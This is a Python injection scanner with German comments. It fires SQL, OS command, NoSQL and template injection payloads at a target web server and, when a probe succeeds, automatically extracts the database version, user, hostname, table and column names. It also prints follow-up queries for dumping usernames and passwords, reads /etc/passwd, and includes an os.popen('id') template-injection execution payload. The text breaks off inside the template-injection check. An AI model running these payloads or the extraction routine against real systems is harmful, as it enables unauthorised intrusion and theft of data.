#!/usr/bin/env python3
"""
INJECTION SCANNER - Echte Injection-Tests mit Payloads
SQL Injection, Command Injection, NoSQL Injection, SSTI, LDAP Injection, XPath Injection
"""

import urllib.request, urllib.error, urllib.parse
import time
import re


def fetch_url(url, method='GET', data=None, headers=None, timeout=15):
    """Helper: URL abrufen"""
    try:
        req = urllib.request.Request(url, method=method)
        req.add_header('User-Agent', 'Mozilla/5.0 (SecurityScan/1.0)')
        if headers:
            for k, v in headers.items():
                req.add_header(k, v)
        if data:
            req.data = data.encode('utf-8') if isinstance(data, str) else data
        resp = urllib.request.urlopen(req, timeout=timeout)
        body = resp.read().decode('utf-8', errors='ignore')
        return body, resp.getcode(), dict(resp.headers)
    except urllib.error.HTTPError as e:
        body = e.read().decode('utf-8', errors='ignore') if e.read() else ''
        return body, e.code, dict(e.headers)
    except Exception as e:
        return str(e), 0, {}


import re

_EXTRACTION_PAYLOADS = {
    'mysql': {
        'version': [
            ("1' UNION SELECT CONCAT('|||DBVERSION:',version(),'|||'),2,3--", r'\|\|\|DBVERSION:([^\|]+)\|\|\|'),
            ("1' AND extractvalue(1,concat(0x7e,version(),0x7e))--", r'~([^~]+)~'),
            ("1' UNION SELECT CONCAT('|||V:',@@version,'|||'),2,3--", r'\|\|\|V:([^\|]+)\|\|\|'),
        ],
        'database': [
            ("1' UNION SELECT CONCAT('|||DBNAME:',database(),'|||'),2,3--", r'\|\|\|DBNAME:([^\|]+)\|\|\|'),
            ("1' AND extractvalue(1,concat(0x7e,database(),0x7e))--", r'~([^~]+)~'),
        ],
        'user': [
            ("1' UNION SELECT CONCAT('|||DBUSER:',user(),'|||'),2,3--", r'\|\|\|DBUSER:([^\|]+)\|\|\|'),
            ("1' UNION SELECT CONCAT('|||DBUSER:',current_user(),'|||'),2,3--", r'\|\|\|DBUSER:([^\|]+)\|\|\|'),
        ],
        'tables': [
            ("1' UNION SELECT CONCAT('|||TABLES:',group_concat(table_name),'|||'),2,3 FROM information_schema.tables WHERE table_schema=database()--", r'\|\|\|TABLES:([^\|]+)\|\|\|'),
            ("1' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))--", r'~([^~]+)~'),
        ],
        'columns': [
            ("1' UNION SELECT CONCAT('|||COLS:',group_concat(column_name),'|||'),2,3 FROM information_schema.columns WHERE table_schema=database() AND table_name='users'--", r'\|\|\|COLS:([^\|]+)\|\|\|'),
        ],
        'counts': [
            ("1' UNION SELECT CONCAT('|||TCOUNT:',count(*),'|||'),2,3 FROM information_schema.tables WHERE table_schema=database()--", r'\|\|\|TCOUNT:(\d+)\|\|\|'),
            ("1' UNION SELECT CONCAT('|||HOST:',@@hostname,'|||'),2,3--", r'\|\|\|HOST:([^\|]+)\|\|\|'),
            ("1' UNION SELECT CONCAT('|||DATA:',@@datadir,'|||'),2,3--", r'\|\|\|DATA:([^\|]+)\|\|\|'),
        ],
    },
    'postgresql': {
        'version': [("1' UNION SELECT CONCAT('|||V:',version(),'|||'),NULL--", r'\|\|\|V:([^\|]+)\|\|\|')],
        'database': [("1' UNION SELECT CONCAT('|||DB:',current_database(),'|||'),NULL--", r'\|\|\|DB:([^\|]+)\|\|\|')],
        'user': [("1' UNION SELECT CONCAT('|||USR:',current_user,'|||'),NULL--", r'\|\|\|USR:([^\|]+)\|\|\|')],
        'tables': [("1' UNION SELECT CONCAT('|||TBL:',string_agg(table_name,','),'|||'),NULL FROM information_schema.tables WHERE table_schema='public'--", r'\|\|\|TBL:([^\|]+)\|\|\|')],
        'columns': [("1' UNION SELECT CONCAT('|||COL:',string_agg(column_name,','),'|||'),NULL FROM information_schema.columns WHERE table_name='users'--", r'\|\|\|COL:([^\|]+)\|\|\|')],
        'counts': [
            ("1' UNION SELECT CONCAT('|||CNT:',count(*),'|||'),NULL FROM information_schema.tables WHERE table_schema='public'--", r'\|\|\|CNT:(\d+)\|\|\|'),
            ("1' UNION SELECT CONCAT('|||H:',inet_server_addr(),'|||'),NULL--", r'\|\|\|H:([^\|]+)\|\|\|'),
        ],
    },
    'mssql': {
        'version': [("1' UNION SELECT CONCAT('|||V:',@@version,'|||'),NULL--", r'\|\|\|V:([^\|]+)\|\|\|')],
        'database': [("1' UNION SELECT CONCAT('|||DB:',DB_NAME(),'|||'),NULL--", r'\|\|\|DB:([^\|]+)\|\|\|')],
        'user': [("1' UNION SELECT CONCAT('|||USR:',SYSTEM_USER,'|||'),NULL--", r'\|\|\|USR:([^\|]+)\|\|\|')],
        'tables': [("1' UNION SELECT CONCAT('|||TBL:',STRING_AGG(name,','),'|||'),NULL FROM sys.tables--", r'\|\|\|TBL:([^\|]+)\|\|\|')],
        'columns': [("1' UNION SELECT CONCAT('|||COL:',STRING_AGG(name,','),'|||'),NULL FROM sys.columns WHERE object_id=OBJECT_ID('users')--", r'\|\|\|COL:([^\|]+)\|\|\|')],
        'counts': [
            ("1' UNION SELECT CONCAT('|||CNT:',COUNT(*),'|||'),NULL FROM sys.tables--", r'\|\|\|CNT:(\d+)\|\|\|'),
            ("1' UNION SELECT CONCAT('|||H:',SERVERPROPERTY('MachineName'),'|||'),NULL--", r'\|\|\|H:([^\|]+)\|\|\|'),
        ],
    },
    'oracle': {
        'version': [("1' UNION SELECT CONCAT('|||V:',banner,'|||'),NULL FROM v$version WHERE ROWNUM=1--", r'\|\|\|V:([^\|]+)\|\|\|')],
        'database': [("1' UNION SELECT CONCAT('|||DB:',SYS_CONTEXT('USERENV','DB_NAME'),'|||'),NULL FROM DUAL--", r'\|\|\|DB:([^\|]+)\|\|\|')],
        'user': [("1' UNION SELECT CONCAT('|||USR:',USER,'|||'),NULL FROM DUAL--", r'\|\|\|USR:([^\|]+)\|\|\|')],
        'tables': [("1' UNION SELECT CONCAT('|||TBL:',LISTAGG(table_name,','),'|||'),NULL FROM user_tables--", r'\|\|\|TBL:([^\|]+)\|\|\|')],
        'columns': [("1' UNION SELECT CONCAT('|||COL:',LISTAGG(column_name,','),'|||'),NULL FROM user_tab_columns WHERE table_name='USERS'--", r'\|\|\|COL:([^\|]+)\|\|\|')],
        'counts': [
            ("1' UNION SELECT CONCAT('|||CNT:',COUNT(*),'|||'),NULL FROM user_tables--", r'\|\|\|CNT:(\d+)\|\|\|'),
            ("1' UNION SELECT CONCAT('|||H:',SYS_CONTEXT('USERENV','HOST'),'|||'),NULL FROM DUAL--", r'\|\|\|H:([^\|]+)\|\|\|'),
        ],
    },
    'sqlite': {
        'version': [("1' UNION SELECT sqlite_version()||'|||V:'||sqlite_version()||'|||',NULL--", r'\|\|\|V:([\d\.]+)\|\|\|')],
        'database': [("1' UNION SELECT CONCAT('|||DB:',name,'|||'),NULL FROM pragma_database_list() WHERE seq=0--", r'\|\|\|DB:([^\|]+)\|\|\|')],
        'tables': [("1' UNION SELECT group_concat(name,',')||'|||TBL:'||group_concat(name,',')||'|||',NULL FROM sqlite_master WHERE type='table'--", r'\|\|\|TBL:([^\|]+)\|\|\|')],
        'columns': [("1' UNION SELECT sql||'|||SQL:'||sql||'|||',NULL FROM sqlite_master WHERE type='table' AND name='users'--", r'\|\|\|SQL:([^\|]+)\|\|\|')],
        'counts': [
            ("1' UNION SELECT COUNT(*)||'|||CNT:'||COUNT(*)||'|||',NULL FROM sqlite_master WHERE type='table'--", r'\|\|\|CNT:(\d+)\|\|\|'),
        ],
    },
}


def _fetch_and_extract(target, param, payload, patterns):
    """Helper: Sende Payload und extrahiere mit mehreren Patterns"""
    try:
        url = f"{target}?{param}={urllib.parse.quote(payload)}"
        body, code, hdrs = fetch_url(url, timeout=20)
        if not body:
            return None
        for pat in patterns:
            m = re.search(pat, body, re.IGNORECASE)
            if m:
                val = m.group(1).strip()
                if val and 1 < len(val) < 500:
                    return val
        # Fallback: Scan nach XPATH Syntax Error
        xpath_m = re.search(r'XPATH syntax error:\s*[\'"]?(([^\'"<\s][^\'"<]{0,200})', body)
        if xpath_m:
            val = xpath_m.group(1).strip('~').strip()
            if val and len(val) > 1:
                return val
    except Exception:
        pass
    return None


def extract_db_info(target, param, db_type='mysql'):
    """Versuche tatsaechlich DB-Infos zu extrahieren - mit Error-based Fallback"""
    extracted = []
    seen = set()
    
    # ===== ERROR-BASED XPATH EXTRAKTION (zuverlaessigste Methode) =====
    # XPATH Syntax Error zeigt Daten direkt in der Fehlermeldung
    xpath_payloads = {
        'mysql': {
            'DB-Version': "1' AND extractvalue(1,concat(0x7e,version(),0x7e))--",
            'DB-Name': "1' AND extractvalue(1,concat(0x7e,database(),0x7e))--",
            'DB-User': "1' AND extractvalue(1,concat(0x7e,user(),0x7e))--",
            'Hostname': "1' AND extractvalue(1,concat(0x7e,@@hostname,0x7e))--",
            'Tabellen': "1' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))--",
            'Spalten': "1' AND extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='users'),0x7e))--",
            'Tabellen-Anzahl': "1' AND extractvalue(1,concat(0x7e,(SELECT count(*) FROM information_schema.tables WHERE table_schema=database()),0x7e))--",
        },
        'postgresql': {
            'DB-Version': "1' AND 1=cast((SELECT version()) as integer)--",
            'DB-Name': "1' AND 1=cast((SELECT current_database()) as integer)--",
            'DB-User': "1' AND 1=cast((SELECT current_user) as integer)--",
            'Tabellen': "1' AND 1=cast((SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public') as integer)--",
        },
        'mssql': {
            'DB-Version': "1' AND 1=@@version--",
            'DB-Name': "1' AND 1=DB_NAME()--",
            'DB-User': "1' AND 1=SYSTEM_USER--",
            'Tabellen': "1' AND 1=(SELECT STRING_AGG(name,',') FROM sys.tables)--",
        },
        'oracle': {
            'DB-Version': "1' OR 1=utl_inaddr.get_host_name((SELECT banner FROM v$version WHERE ROWNUM=1))--",
            'DB-Name': "1' AND 1=(SELECT COUNT(*) FROM user_tables)--",
            'DB-User': "1' AND 1=(SELECT COUNT(*) FROM dual CONNECT BY 1=1 START WITH 1=1)--",
            'Tabellen': "1' OR 1=utl_inaddr.get_host_name((SELECT LISTAGG(table_name,',') FROM user_tables))--",
        },
        'sqlite': {
            'DB-Version': "1' AND sqlite_version()||randomblob(1000000000)--",
            'Tabellen': "1' AND (SELECT group_concat(name,',') FROM sqlite_master WHERE type='table')||randomblob(1000000000)--",
        },
    }
    
    # Versuche XPATH Error-based Extraktion
    db_xpath = xpath_payloads.get(db_type, xpath_payloads['mysql'])
    for label, payload in db_xpath.items():
        val = _fetch_and_extract(target, param, payload, [r'~([^~]+)~', r'XPATH syntax error:\s*[\'"]?(^\'"<\s][^\'"<]{0,200})'])
        if val and f"xpath:{label}:{val[:50]}" not in seen:
            seen.add(f"xpath:{label}:{val[:50]}")
            if label == 'Tabellen' and ',' in val:
                tables = [t.strip() for t in val.split(',')[:15]]
                extracted.append(f"Tabellen: {', '.join(tables)}")
            elif label == 'Spalten' and ',' in val:
                cols = [c.strip() for c in val.split(',')[:10]]
                extracted.append(f"Spalten (users): {', '.join(cols)}")
            else:
                extracted.append(f"{label}: {val}")
    
    # ===== UNION SELECT MARKER EXTRAKTION =====
    db_payloads = _EXTRACTION_PAYLOADS.get(db_type, _EXTRACTION_PAYLOADS['mysql'])
    for category, payload_list in db_payloads.items():
        for payload, pattern in payload_list:
            val = _fetch_and_extract(target, param, payload, [pattern])
            if val and f"union:{category}:{val[:50]}" not in seen:
                seen.add(f"union:{category}:{val[:50]}")
                label_map = {
                    'version': 'DB-Version', 'database': 'DB-Name', 'user': 'DB-User',
                    'tables': 'Tabellen', 'columns': 'Spalten', 'counts': 'Anzahl',
                }
                label = label_map.get(category, category)
                if category == 'tables' and ',' in val:
                    tables = [t.strip() for t in val.split(',')[:15]]
                    extracted.append(f"Tabellen: {', '.join(tables)}")
                elif category == 'columns' and ',' in val:
                    cols = [c.strip() for c in val.split(',')[:10]]
                    extracted.append(f"Spalten: {', '.join(cols)}")
                elif category == 'counts':
                    extracted.append(f"Anzahl Tabellen: {val}")
                elif category == 'version' and not any('DB-Version' in e for e in extracted):
                    extracted.append(f"DB-Version: {val}")
                elif category == 'database' and not any('DB-Name' in e for e in extracted):
                    extracted.append(f"DB-Name: {val}")
                elif category == 'user' and not any('DB-User' in e for e in extracted):
                    extracted.append(f"DB-User: {val}")
                else:
                    extracted.append(f"{label}: {val}")
    
    # ===== UPDATEXML FALLBACK (MySQL only) =====
    if db_type == 'mysql':
        updatexml_payloads = {
            'DB-Version': "1' AND updatexml(1,concat(0x7e,version(),0x7e),1)--",
            'DB-Name': "1' AND updatexml(1,concat(0x7e,database(),0x7e),1)--",
            'DB-User': "1' AND updatexml(1,concat(0x7e,user(),0x7e),1)--",
            'Tabellen': "1' AND updatexml(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e),1)--",
        }
        for label, payload in updatexml_payloads.items():
            val = _fetch_and_extract(target, param, payload, [r'~([^~]+)~'])
            if val and f"xml:{label}:{val[:50]}" not in seen:
                seen.add(f"xml:{label}:{val[:50]}")
                if label == 'Tabellen' and ',' in val:
                    tables = [t.strip() for t in val.split(',')[:15]]
                    extracted.append(f"Tabellen: {', '.join(tables)}")
                elif not any(label in e for e in extracted):
                    extracted.append(f"{label}: {val}")
    
    # ===== RESPONSE SCAN FALLBACK =====
    # Wenn gar nichts gefunden, scannen wir nach DB-Errors die Infos enthalten
    try:
        test_url = f"{target}?{param}={urllib.parse.quote(chr(39))}"
        body, code, hdrs = fetch_url(test_url, timeout=15)
        if body:
            # MySQL Version aus Error
            if db_type == 'mysql':
                m = re.search(r'([\d\.]+[\-a-zA-Z]*-MariaDB[\-a-zA-Z\d\.]*)', body, re.I)
                if m and not any('DB-Version' in e for e in extracted):
                    extracted.append(f"DB-Version: {m.group(1)}")
            # PostgreSQL Version
            if db_type == 'postgresql':
                m = re.search(r'(PostgreSQL\s+[\d\.]+)', body, re.I)
                if m and not any('DB-Version' in e for e in extracted):
                    extracted.append(f"DB-Version: {m.group(1)}")
            # MSSQL
            if db_type == 'mssql':
                m = re.search(r'(Microsoft\s+SQL\s+Server[^<\r\n]{0,100})', body, re.I)
                if m and not any('DB-Version' in e for e in extracted):
                    extracted.append(f"DB-Version: {m.group(1).strip()}")
    except Exception:
        pass
    
    return extracted


def detect_db_type(body):
    """Erkenne Datenbank-Typ aus Fehlermeldung"""
    body_lower = body.lower()
    if 'mysql' in body_lower or 'mariadb' in body_lower:
        return 'mysql'
    elif 'postgresql' in body_lower or 'pg_' in body_lower:
        return 'postgresql'
    elif 'ora-' in body_lower or 'oracle' in body_lower or 'pl/sql' in body_lower:
        return 'oracle'
    elif 'sql server' in body_lower or 'mssql' in body_lower or 'odbc' in body_lower:
        return 'mssql'
    elif 'sqlite' in body_lower:
        return 'sqlite'
    return 'mysql'  # Default


def scan_sql_injection(target):
    """SQL Injection Tests - Error-based und Time-based"""
    findings = []
    
    # SQL Error Keywords
    SQL_ERRORS = [
        'sql syntax', 'mysql_fetch', 'mysql_error', 'mysql_query',
        'ORA-', 'Oracle error', 'Microsoft OLE DB',
        'ODBC SQL Server Driver', 'SQLServer JDBC',
        'PostgreSQL query failed', 'pg_query',
        'sqlite_query', 'SQLite/JDBC',
        'Warning: mysql', 'SQL syntax.*MySQL',
        'valid MySQL result', 'MySqlClient',
        'PostgreSQL.*ERROR', 'Warning.*pg_',
        'SQLite3::', 'sqlite_',
        'mongo', 'MongoError',
        'You have an error in your SQL syntax',
        'Unclosed quotation mark',
        'quoted string not properly terminated',
        'syntax error at or near',
        'fatal error in database',
        'database error'
    ]
    
    # Error-based payloads für verschiedene Parameter
    error_payloads = [
        "'", "''", "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*",
        "1' ORDER BY 100--", "1' AND 1=1--", "1' AND 1=2--",
        "1' UNION SELECT null--", "1' UNION SELECT null,null--",
        "' AND 1=1--", "' AND 1=2--",
        "1 AND 1=1", "1 AND 1=2",
        "1 OR 1=1", "1' OR '1'='1",
        "1' AND SLEEP(0)--", "1' AND 1=1#",
        "1') AND ('1'='1", "1') AND ('1'='2",
        "1' AND '1'='1", "1' AND '1'='2",
        '1" AND "1"="1', '1" AND "1"="2',
        "%27", "%27%20OR%20%271%27=%271",
        "\xbf\x27 OR 1=1 --",  # Multi-byte bypass
    ]
    
    # Time-based payloads
    time_payloads = [
        ("1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --", 5),
        ("1' AND SLEEP(5) --", 5),
        ("1' AND pg_sleep(5) --", 5),
        ("1'; WAITFOR DELAY '0:0:5' --", 5),
        ("1' AND 1=(SELECT 1 FROM pg_sleep(5)) --", 5),
        ("1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5) --", 5),
        ("1' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END) --", 5),
    ]
    
    # Test-URLs mit Query-Parametern
    test_params = ['id', 'page', 'user', 'product', 'cat', 'category', 'item', 
                   'pid', 'uid', 'sid', 'tid', 'q', 'search', 'query', 'name',
                   'email', 'username', 'password', 'code', 'token', 'ref',
                   'sort', 'order', 'dir', 'file', 'path', 'url', 'redirect',
                   'return', 'next', 'goto', 'view', 'action', 'type', 'format']
    
    parsed = urllib.parse.urlparse(target)
    base = f"{parsed.scheme}://{parsed.netloc}"
    
    # Phase 1: Error-based SQL Injection
    print("  [SQLi] Phase 1: Error-based tests...")
    tested = 0
    for param in test_params[:10]:  # Top 10 Parameter
        for payload in error_payloads[:8]:  # Top 8 Payloads
            try:
                test_url = f"{base}/?{param}={urllib.parse.quote(payload)}"
                body, code, headers = fetch_url(test_url)
                tested += 1
                
                if body:
                    body_lower = body.lower()
                    for error_sig in SQL_ERRORS:
                        if error_sig.lower() in body_lower:
                            # DB-Typ erkennen und tatsaechlich Daten extrahieren!
                            db_type = detect_db_type(body)
                            extracted = extract_db_info(base, param, db_type)
                            
                            evidence_text = (
                                f"SQL ERROR gefunden: '{error_sig}'\n"
                                f"Datenbank-Typ: {db_type.upper()}\n\n"
                            )
                            
                            if extracted:
                                evidence_text += f"=== ECHTE EXTRAKTION ERFOLGREICH! ===\n"
                                for item in extracted:
                                    evidence_text += f"  ✓ {item}\n"
                                evidence_text += f"\n"
                            
                            evidence_text += (
                                f"=== Weitere Extraktion moeglich: ===\n"
                                f"  {payload} AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--\n"
                                f"    → DB-Version\n"
                                f"  {payload} AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--\n"
                                f"    → DB-Name\n"
                                f"  {payload} AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))--\n"
                                f"    → ALLE Tabellen\n"
                                f"  {payload} AND extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'),0x7e))--\n"
                                f"    → Spalten von 'users'\n"
                                f"  {payload} AND extractvalue(1,concat(0x7e,(SELECT count(*) FROM users),0x7e))--\n"
                                f"    → Anzahl User\n\n"
                                f"HTTP Status: {code}"
                            )
                            
                            findings.append({
                                "id": "SQLI-001",
                                "severity": "critical",
                                "type": "sql_injection",
                                "title": f"SQL Injection (Error-based) in '{param}' - DB: {db_type.upper()}{' [DATEN EXTRahiERT!]' if extracted else ''}",
                                "url": test_url,
                                "parameter": param,
                                "payload": payload,
                                "evidence": evidence_text,
                                "remediation": "Parameterized Queries/Prepared Statements verwenden. Eingabe validieren. ORM nutzen."
                            })
                            return findings  # Sofort return bei Critical
            except:
                continue
    
    # Phase 2: Time-based SQL Injection
    print("  [SQLi] Phase 2: Time-based tests...")
    for param in test_params[:5]:
        for payload, delay in time_payloads[:4]:
            try:
                test_url = f"{base}/?{param}={urllib.parse.quote(payload)}"
                start = time.time()
                body, code, headers = fetch_url(test_url, timeout=delay+3)
                elapsed = time.time() - start
                
                if elapsed >= delay * 0.8:  # 80% des Delays erreicht
                    # Versuche tatsaechlich DB-Infos zu extrahieren!
                    db_type = detect_db_type(body or '')
                    extracted = extract_db_info(base, param, db_type)
                    
                    evidence_text = (
                        f"Response dauerte {elapsed:.1f}s (Payload fordert {delay}s Delay).\n"
                        f"Datenbank-Typ: {db_type.upper()}\n\n"
                    )
                    
                    if extracted:
                        evidence_text += f"=== ECHTE EXTRAKTION ERFOLGREICH! ===\n"
                        for item in extracted:
                            evidence_text += f"  ✓ {item}\n"
                        evidence_text += f"\n"
                    
                    evidence_text += (
                        f"=== Time-Based Daten-Extraktion (Buchstabe fuer Buchstabe): ===\n"
                        f"  {param}=1' AND IF(ASCII(SUBSTRING((SELECT version()),1,1))>64,SLEEP(5),0)--\n"
                        f"    → Ist erster Buchstabe der Version > 'A'?\n"
                        f"  {param}=1' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>64,SLEEP(5),0)--\n"
                        f"    → Erster Buchstabe des DB-Namens > 'A'?\n"
                        f"  {param}=1' AND IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1))>64,SLEEP(5),0)--\n"
                        f"    → Erster Buchstabe erster Tabelle > 'A'?\n"
                        f"  {param}=1' AND IF((SELECT COUNT(*) FROM information_schema.tables)>10,SLEEP(5),0)--\n"
                        f"    → Mehr als 10 Tabellen?\n\n"
                        f"Mit 5s Delay pro Bit kann man die komplette DB auslesen!"
                    )
                    
                    findings.append({
                        "id": "SQLI-002",
                        "severity": "critical", 
                        "type": "sql_injection_blind",
                        "title": f"Blind SQL Injection (Time-based) in '{param}' - DB: {db_type.upper()}{' [DATEN EXTRahiERT!]' if extracted else ''}",
                        "url": test_url,
                        "parameter": param,
                        "payload": payload,
                        "evidence": evidence_text,
                        "remediation": "Parameterized Queries verwenden. Timeouts auf Application-Level setzen."
                    })
                    return findings
            except:
                continue
    
    # Phase 3: UNION-based Test
    print("  [SQLi] Phase 3: UNION-based tests...")
    union_payloads = [
        "1' UNION SELECT NULL--",
        "1' UNION SELECT NULL,NULL--", 
        "1' UNION SELECT NULL,NULL,NULL--",
        "1' UNION SELECT 'test','test','test'--",
        "1 UNION SELECT NULL,NULL--",
    ]
    for param in test_params[:5]:
        for payload in union_payloads:
            try:
                test_url = f"{base}/?{param}={urllib.parse.quote(payload)}"
                body, code, headers = fetch_url(test_url)
                if body and ('NULL' in body or 'test' in body.lower()):
                    if code == 200:
                        col_count = payload.count('NULL') + (1 if 'test' in payload else 0)
                        
                        # Versuche tatsaechlich Daten via UNION zu extrahieren!
                        db_type = detect_db_type(body)
                        extracted = extract_db_info(base, param, db_type)
                        
                        evidence_text = (
                            f"UNION Payload reflektiert in Response. HTTP {code}. {col_count} Spalten.\n"
                            f"Datenbank-Typ: {db_type.upper()}\n\n"
                        )
                        
                        if extracted:
                            evidence_text += f"=== ECHTE EXTRAKTION ERFOLGREICH! ===\n"
                            for item in extracted:
                                evidence_text += f"  ✓ {item}\n"
                            evidence_text += f"\n"
                        
                        evidence_text += (
                            f"=== DIREKTE Daten-Extraktion via UNION: ===\n"
                            f"  {param}={payload.rstrip('--')} version()--\n"
                            f"    → DB-Version\n"
                            f"  {param}={payload.rstrip('--')} user(),database()--\n"
                            f"    → User + DB-Name\n"
                            f"  {param}={payload.rstrip('--')} table_name,column_name FROM information_schema.columns WHERE table_schema=database() LIMIT 1--\n"
                            f"    → Tabellen + Spalten\n"
                            f"  {param}={payload.rstrip('--')} count(*) FROM information_schema.tables--\n"
                            f"    → Anzahl Tabellen\n"
                            f"  {param}={payload.rstrip('--')} username,password FROM users--\n"
                            f"    → ALLE User + Passwoerter!\n\n"
                            f"UNION ist die SCHNELLSTE SQLi-Methode - direkter Zugriff!"
                        )
                        
                        findings.append({
                            "id": "SQLI-003",
                            "severity": "critical",
                            "type": "sql_injection_union",
                            "title": f"UNION SQL Injection in '{param}' - {col_count} Spalten, DB: {db_type.upper()}{' [DATEN EXTRahiERT!]' if extracted else ''}",
                            "url": test_url,
                            "parameter": param,
                            "payload": payload,
                            "evidence": evidence_text,
                            "remediation": "Prepared Statements. Spaltenanzahl validieren."
                        })
                        return findings
            except:
                continue
    
    if not findings:
        findings.append({
            "id": "SQLI-OK",
            "severity": "info",
            "type": "sql_injection",
            "title": "Keine SQL Injection gefunden",
            "url": target,
            "evidence": f"{tested} Payloads getestet. Keine SQL-Errors oder Time-Delays.",
            "remediation": "Weiterhin Prepared Statements verwenden."
        })
    
    return findings


def scan_command_injection(target):
    """OS Command Injection Tests"""
    findings = []
    
    cmd_payloads = [
        "; whoami", "| whoami", "` whoami`", "$(whoami)",
        "; id", "| id", "` id`", "$(id)",
        "; uname -a", "| uname -a",
        "; ping -c 3 127.0.0.1", "| ping -c 3 127.0.0.1",
        "; cat /etc/passwd", "| cat /etc/passwd",
        "; ls -la", "| ls -la",
        "&& whoami", "|| whoami",
        "; dir", "| dir", "; type C:\\windows\\win.ini",
        "| powershell.exe whoami",
    ]
    
    cmd_indicators = [
        'root:', 'daemon:', 'bin:', 'sys:',  # /etc/passwd
        'administrator', 'nt authority',  # Windows
        'Linux ', 'Darwin ', 'FreeBSD',  # uname
        'total ', 'drwx', '-rw-',  # ls -la
        'for 16-bit app support',  # win.ini
    ]
    
    parsed = urllib.parse.urlparse(target)
    base = f"{parsed.scheme}://{parsed.netloc}"
    test_params = ['q', 'search', 'id', 'name', 'file', 'path', 'url', 'cmd', 
                   'command', 'exec', 'ip', 'host', 'domain', 'target']
    
    print("  [CMDi] Testing command injection...")
    for param in test_params[:8]:
        for payload in cmd_payloads[:10]:
            try:
                test_url = f"{base}/?{param}={urllib.parse.quote(payload)}"
                body, code, headers = fetch_url(test_url)
                
                if body:
                    for indicator in cmd_indicators:
                        if indicator.lower() in body.lower():
                            findings.append({
                                "id": "CMDI-001",
                                "severity": "critical",
                                "type": "command_injection",
                                "title": f"OS Command Injection in Parameter '{param}'",
                                "url": test_url,
                                "parameter": param,
                                "payload": payload,
                                "evidence": f"Command Output gefunden: '{indicator}' in Response",
                                "remediation": "Eingabe validieren. OS-Commands vermeiden. Whitelist-Approach."
                            })
                            return findings
            except:
                continue
    
    # Time-based Command Injection
    time_payloads = [
        ("; sleep 5", 5), ("| sleep 5", 5),
        ("; ping -n 5 127.0.0.1", 5), ("| ping -n 5 127.0.0.1", 5),
    ]
    for param in test_params[:5]:
        for payload, delay in time_payloads:
            try:
                test_url = f"{base}/?{param}={urllib.parse.quote(payload)}"
                start = time.time()
                body, code, headers = fetch_url(test_url, timeout=delay+3)
                elapsed = time.time() - start
                
                if elapsed >= delay * 0.8:
                    findings.append({
                        "id": "CMDI-002",
                        "severity": "critical",
                        "type": "command_injection_blind",
                        "title": f"Blind Command Injection (Time-based) in '{param}'",
                        "url": test_url,
                        "parameter": param,
                        "payload": payload,
                        "evidence": f"Response dauerte {elapsed:.1f}s (Command Injection Delay).",
                        "remediation": "OS-Commands niemals mit User-Input ausführen."
                    })
                    return findings
            except:
                continue
    
    if not findings:
        findings.append({
            "id": "CMDI-OK",
            "severity": "info",
            "type": "command_injection",
            "title": "Keine Command Injection gefunden",
            "url": target,
            "evidence": "OS-Command Payloads getestet. Keine Command Output in Response.",
            "remediation": "Weiterhin keine OS-Commands mit User-Input ausführen."
        })
    
    return findings


def scan_nosql_injection(target):
    """NoSQL Injection Tests (MongoDB)"""
    findings = []
    
    nosql_payloads = [
        '{"$gt": ""}', '{"$ne": null}', '{"$exists": true}',
        '{"$regex": ".*"}', '{"$where": "this"}',
        '{"$gt": ""}', '{"$lt": ""}',
    ]
    
    parsed = urllib.parse.urlparse(target)
    base = f"{parsed.scheme}://{parsed.netloc}"
    
    # Test via POST JSON
    print("  [NoSQLi] Testing NoSQL injection...")
    for payload in nosql_payloads[:4]:
        try:
            headers = {'Content-Type': 'application/json'}
            body, code, hdrs = fetch_url(base + '/api/login', method='POST', 
                                         data=f'{{"username": {payload}, "password": "test"}}',
                                         headers=headers)
            if code == 200 and ('token' in body.lower() or 'success' in body.lower()):
                findings.append({
                    "id": "NOSQL-001",
                    "severity": "critical",
                    "type": "nosql_injection",
                    "title": "NoSQL Injection (MongoDB) in Login",
                    "url": base + '/api/login',
                    "payload": payload,
                    "evidence": f"NoSQL Payload '{payload}' führte zu erfolgreichem Login. HTTP {code}.",
                    "remediation": "NoSQL-Queries parametrisieren. $where deaktivieren. Input validieren."
                })
                return findings
        except:
            continue
    
    if not findings:
        findings.append({
            "id": "NOSQL-OK",
            "severity": "info",
            "type": "nosql_injection",
            "title": "Keine NoSQL Injection gefunden",
            "url": target,
            "evidence": "MongoDB-NoSQL Payloads getestet.",
            "remediation": "Weiterhin NoSQL-Queries parametrisieren."
        })
    
    return findings


def scan_ssti(target):
    """Server-Side Template Injection"""
    findings = []
    
    ssti_payloads = [
        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
        "{{config}}", "{{self}}", "{{7*'7'}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    ]
    
    indicators = ['49', '7777777', '<class', 'os.', 'popen']
    
    parsed = urllib.parse.urlparse(target)
    base = f"{parsed.scheme}://{parsed.netloc}"
    test_params = ['name', 'template', 'view', 'page', 'id', 'q']
    
    print("  [SSTI] Testing template injection...")
    for param in test_params:
        for payload in ssti_payloads[:6]:
            try:
                test_url = f"{base}/?{param}={urllib.parse.quote(payload)}"
                body, code, headers = fetch_url(test_url)
                
                if body:
                    for ind in indicators:
                        if ind in body:
                            findings.append({
                                "id": "SSTI-001",
                                "severity": "critical",
                                "type": "ssti",
                                "title": f"Server-Side Template Injection in Parameter '{param}'",
                                "url": test_url,
